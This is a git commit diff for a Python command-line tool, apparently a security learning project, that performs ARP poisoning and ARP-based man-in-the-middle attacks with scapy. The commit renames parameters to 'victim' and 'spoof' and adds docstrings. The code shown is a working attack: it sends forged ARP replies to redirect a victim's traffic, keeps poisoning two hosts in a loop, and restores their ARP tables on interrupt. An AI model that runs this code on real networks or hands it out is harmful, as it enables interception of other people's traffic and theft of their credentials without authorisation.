e4e5b63a5b300df5b07b64ea7466b1b31afacc22
Brikkel@Crush <rikvanbrakel24@gmail.com>
2023-05-31 13:31:48 +0200

    updated documentation and made variables names make more sense

--- cuckoo_byte.py
+++ cuckoo_byte.py
@@ -1,46 +1,55 @@
 import click
 from functions import *
 from functions.general import list_interfaces, get_target_mac
-from functions.arp import poison, restore_arp, mitm
+from functions.arp import poison, restore_arp, mitm_arp
 
 
 @click.group()
 def cli():
     pass
 
+
+# ------------------------------------------------- ARP ------------------------------------------------ #
 @cli.command()
-@click.option('-s', '--source', type=str, help='The intended victim')
 @click.option('-v', '--victim', type=str, help='The intended victim')
-def arp(source, victim):
+@click.option('-s', '--spoof', type=str, help='What ip do you want to impersonate')
+def arp(victim, spoof):
+    '''ARP poison a specified victim once'''
     click.echo('ARP Poisoning...')
-    poison(source, victim)
+    poison(victim, spoof)
 
 @cli.command()
-@click.option('-d', '--destination', type=str, help='The destination IP for ARP restoration')
-@click.option('-s', '--source', type=str, help='The source IP for ARP restoration')
-def restore(destination, source):
+@click.option('-v', '--victim', type=str, help='The victim IP for ARP restoration')
+@click.option('-s', '--spoof', type=str, help='The spoofed IP for ARP restoration')
+def restore(victim, spoof):
+    '''Restore the ARP table of the specified victim'''
     click.echo('Restoring ARP...')
-    restore_arp(destination, source)
+    restore_arp(victim, spoof)
 
 @cli.command()
-@click.option('-t1', '--target1', type=str, help='IP of target 1')
-@click.option('-t2', '--target2', type=str, help='IP of target 2')
-def mitm(target1, target2):
+@click.option('-v1', '--victim1', type=str, help='IP of victim 1')
+@click.option('-v2', '--victim2', type=str, help='IP of victim 2')
+def mitm(victim1, victim2):
+    '''Execute a man in the middle attack using arp poisoning'''
     click.echo('Man-in-the-Middle attack in progress...')
-    mitm(target1, target2)    
+    mitm_arp(victim1, victim2)
 
+# ------------------------------------------------ General ----------------------------------------------- #
 @cli.command()
 def ls_if(): # _ translate to - so the command will be ls-if
+    '''List the interfaces of your machine'''
     click.echo(list_interfaces())
 
 @cli.command()
 @click.option('-i', '--ip', type=str, help='The IP of the target you want the mac address of')
 def target_mac(ip): # _ translate to - so the command will be target-mac
+    '''Get the mac adress of a specified IP adress'''
     click.echo(f'Target MAC address: {get_target_mac(ip)}')
 
+
 # ---- testing ----
-@cli.command()
-@click.option('-n', '--name', type=str, help='your first name', default='john')
-@click.option('-l', '--last-name', type=str, help='your last name', default='doe')
-def test(name, last_name):
-    click.echo(f'hello {name} {last_name}')
+# @cli.command()
+# @click.option('-n', '--name', type=str, help='your first name', default='john')
+# @click.option('-l', '--last-name', type=str, help='your last name', default='doe')
+# def test(name, last_name):
+#     click.echo(f'hello {name} {last_name}')
--- functions/arp.py
+++ functions/arp.py
@@ -1,40 +1,48 @@
 '''This package contains everything related to ARP poisoning'''
-from scapy.all import Ether, ARP, send, srp
+from scapy.all import ARP, send
 from .general import get_target_mac
-from time import time
+from time import sleep
 
-def poison(target_ip, spoof_ip):
+def poison(victim_ip, spoof_ip):
     '''Change mac address in arp table'''
-    # Get target host ip address using previously created function
-    target_mac = get_target_mac(target_ip)
 
-    # Create ARP packet. target_ip - target host ip address, spoof_ip - gateway ip address
+    # Get victim host ip address using previously created function
+    victim_mac = get_target_mac(victim_ip)
+
+    # Create the ARP packet, scapy will add your MAC address for hwsrc
     # op=2 means that ARP is going to send answer 
-    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    # Send previously created packet without output
+    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
+    
+    # print(packet) #debugging
+
+    # Send the ARP packet without output
     send(packet, verbose=False)
 
 
-def restore_arp(dest_ip, source_ip):
+def restore_arp(victim_ip, spoof_ip):
     '''Restore mac address in arp table'''
-    dest_mac = get_target_mac(dest_ip)
-    source_mac = get_target_mac(source_ip)
-    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
-                       psrc=source_ip, hwsrc=source_mac)
+
+    # Find the MAC adresses of the victim and the IP you spoofed
+    victim_mac = get_target_mac(victim_ip)
+    spoof_real_mac = get_target_mac(spoof_ip)
+    
+    # Create the ARP packet, Now we want to add the actual MAC of the spoofed IP
+    packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
+                       psrc=spoof_ip, hwsrc=spoof_real_mac)
+    
+    # Send the ARP packet without output
     send(packet, count=4, verbose=False)
 
-def mitm(target_1_ip, target_2_ip):
-    '''This sets up a man in the middle between the two provided target IPs'''
-    sent_packets_count = 0
+def mitm_arp(victim_1_ip, victim_2_ip):
+    '''This sets up a man in the middle between the two provided victim IPs'''
+    poison_rounds = 0
     try:
         while True:
-            poison(target_1_ip, target_2_ip)
-            poison(target_2_ip, target_1_ip)
-            sent_packets_count += 2
-            print(f'\r[+] Packets sent: {sent_packets_count}', end='')
-            time.sleep(2)
+            poison(victim_1_ip, victim_2_ip)
+            poison(victim_2_ip, victim_1_ip)
+            sleep(2)
     except KeyboardInterrupt:
         print('\nInterupted, Reseting ARP tables. Please wait')
-        restore_arp(target_1_ip, target_2_ip)
-        restore_arp(target_2_ip, target_1_ip)
+        restore_arp(victim_1_ip, victim_2_ip)
+        restore_arp(victim_2_ip, victim_1_ip)
         print('\nARP table restored.')
